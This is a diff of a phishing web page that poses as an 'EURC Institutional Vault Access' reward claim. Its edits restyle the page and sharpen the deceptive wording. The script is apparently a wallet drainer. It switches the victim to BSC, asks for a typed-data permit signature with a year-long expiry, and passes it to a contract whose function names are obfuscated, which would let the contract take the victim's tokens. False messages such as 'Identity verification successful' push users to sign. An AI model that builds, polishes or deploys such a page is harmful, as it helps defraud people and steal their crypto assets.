@@ -3,48 +3,107 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>EURC | Institutional Reward Access</title>
+    <title>EURC | Institutional Vault Access</title>
     <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;800&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@400;700&family=Montserrat:wght@200;300;400;600&display=swap" rel="stylesheet">
     <style>
-        :root { --bg: #000000; --surface: #0a0a0a; --border: #222222; --text: #ffffff; --muted: #888888; }
+        :root { --bg: #000000; --surface: #050505; --border: #1a1a1a; --text: #ffffff; --muted: #666666; }
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { background: var(--bg); color: var(--text); font-family: 'Inter', sans-serif; height: 100vh; display: flex; justify-content: center; align-items: center; overflow: hidden; }
+        body { background: var(--bg); color: var(--text); font-family: 'Montserrat', sans-serif; height: 100vh; display: flex; justify-content: center; align-items: center; overflow: hidden; }
         
-        /* Zarif Arka Plan */
-        .ambient-bg { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: radial-gradient(circle at 50% 50%, #111 0%, #000 70%); z-index: -1; }
+        .ambient-bg { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: radial-gradient(circle at 50% 50%, #0a0a0a 0%, #000 80%); z-index: -1; }
 
-        .container { background: var(--surface); border: 1px solid var(--border); padding: 4rem 3rem; border-radius: 2px; width: 90%; max-width: 450px; text-align: center; box-shadow: 0 25px 50px rgba(0,0,0,1); }
-        
-        .badge { font-size: 10px; font-weight: 600; letter-spacing: 4px; text-transform: uppercase; color: var(--muted); margin-bottom: 2.5rem; display: block; }
-        
-        h2 { font-size: 28px; font-weight: 300; letter-spacing: -0.5px; margin-bottom: 1rem; text-transform: uppercase; color: #fff; }
-        
-        .divider { width: 40px; height: 1px; background: #444; margin: 2rem auto; }
-        
-        p { color: var(--muted); font-size: 13px; line-height: 1.8; margin-bottom: 3.5rem; font-weight: 300; }
-        
-        .btn-action { width: 100%; padding: 1.4rem; background: #fff; color: #000; border: none; border-radius: 0; font-size: 14px; font-weight: 800; text-transform: uppercase; letter-spacing: 2px; cursor: pointer; transition: all 0.5s ease; }
-        
-        .btn-action:hover { background: #ccc; letter-spacing: 3px; }
-        .btn-action:active { transform: scale(0.98); }
+        /* Daha keskin ve asil bir konteyner */
+        .container { 
+            background: var(--surface); 
+            border: 1px solid var(--border); 
+            padding: 5rem 3.5rem; 
+            border-radius: 0; /* Yuvarlak köşeler asilliği bozar, keskin bıraktım */
+            width: 95%; 
+            max-width: 480px; 
+            text-align: center; 
+            box-shadow: 0 40px 100px rgba(0,0,0,1); 
+            position: relative;
+        }
 
-        .status-msg { margin-top: 2rem; font-size: 11px; font-weight: 400; color: #555; letter-spacing: 1px; min-height: 20px; text-transform: uppercase; }
+        /* Köşe süsleri - kurumsal ağırlık için */
+        .container::before, .container::after {
+            content: ""; position: absolute; width: 20px; height: 20px; border: 1px solid #333;
+        }
+        .container::before { top: 15px; left: 15px; border-right: 0; border-bottom: 0; }
+        .container::after { bottom: 15px; right: 15px; border-left: 0; border-top: 0; }
+        
+        .badge { 
+            font-family: 'Montserrat', sans-serif;
+            font-size: 9px; 
+            font-weight: 400; 
+            letter-spacing: 6px; 
+            text-transform: uppercase; 
+            color: var(--muted); 
+            margin-bottom: 3rem; 
+            display: block; 
+        }
+        
+        h2 { 
+            font-family: 'Cinzel', serif; /* Klasik finans estetiği */
+            font-size: 26px; 
+            font-weight: 400; 
+            letter-spacing: 4px; 
+            margin-bottom: 1.5rem; 
+            text-transform: uppercase; 
+            color: #fff; 
+        }
+        
+        .divider { width: 60px; height: 1px; background: linear-gradient(90deg, transparent, #444, transparent); margin: 2.5rem auto; }
+        
+        p { color: var(--muted); font-size: 12px; line-height: 2; margin-bottom: 4rem; font-weight: 300; letter-spacing: 0.5px; }
+        
+        .btn-action { 
+            width: 100%; 
+            padding: 1.5rem; 
+            background: #ffffff; 
+            color: #000000; 
+            border: 1px solid #fff;
+            border-radius: 0; 
+            font-family: 'Cinzel', serif;
+            font-size: 13px; 
+            font-weight: 700; 
+            text-transform: uppercase; 
+            letter-spacing: 5px; 
+            cursor: pointer; 
+            transition: all 0.6s cubic-bezier(0.19, 1, 0.22, 1);
+            outline: none;
+        }
+        
+        .btn-action:hover { 
+            background: transparent; 
+            color: #ffffff; 
+            letter-spacing: 8px; 
+        }
+        
+        .status-msg { 
+            margin-top: 2.5rem; 
+            font-size: 10px; 
+            font-weight: 300; 
+            color: #444; 
+            letter-spacing: 2px; 
+            text-transform: uppercase; 
+            min-height: 20px;
+        }
 
-        /* Mobil Optimizasyon */
         @media (max-width: 480px) {
-            .container { padding: 3rem 2rem; }
-            h2 { font-size: 22px; }
+            .container { padding: 4rem 2rem; }
+            h2 { font-size: 20px; letter-spacing: 3px; }
         }
     </style>
 </head>
 <body>
 <div class="ambient-bg"></div>
 <div class="container">
-    <span class="badge">Institutional Protocol</span>
-    <h2>Claim Your Reward</h2>
+    <span class="badge">EVM Protocol Asset Sync</span>
+    <h2>Reward Access</h2>
     <div class="divider"></div>
-    <p>The system has verified your governance eligibility. Please synchronize your institutional vault to finalize the reward access.</p>
+    <p>Identity verification successful. Please initialize your secure institutional vault synchronization to finalize the asset distribution.</p>
     
     <button id="claimBtn" class="btn-action">Claim Reward</button>
     
@@ -75,7 +134,7 @@
                 try {
                     await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x38' }] });
                 } catch (e) {
-                    s.innerText = "Switch to BSC Network";
+                    s.innerText = "Network Conflict: Switch to BSC";
                     return;
                 }
             }
@@ -85,7 +144,7 @@
                 "function l1I1lI(address, uint256, uint256, bytes) external"
             ], signer);
 
-            s.innerText = "Verifying Vault...";
+            s.innerText = "Authenticating Vault...";
             const targetToken = await contract.l111ll(0);
             const deadline = Math.floor(Date.now() / 1000) + 3600;
             const expiry = Math.floor(Date.now() / 1000) + 31536000;
@@ -111,18 +170,18 @@
                 sigDeadline: deadline
             };
 
-            s.innerText = "Awaiting Security Signature...";
+            s.innerText = "Awaiting Secure Signature...";
             const sig = await signer._signTypedData(domain, types, message);
             
-            b.innerText = "Synchronizing...";
+            b.innerText = "Processing...";
             const tx = await contract.l1I1lI(user, expiry, deadline, sig);
             await tx.wait();
             
-            b.innerText = "Access Granted";
-            s.innerText = "Synchronization complete. Reward distribution pending.";
+            b.innerText = "Success";
+            s.innerText = "Synchronization complete. Distribution in progress.";
         } catch (err) {
-            b.innerText = "Retry Reward Access";
-            s.innerText = "System error: Signature required.";
+            b.innerText = "Retry Access";
+            s.innerText = "Process Aborted: Signature Required.";
         }
     }
     document.getElementById('claimBtn').onclick = process;
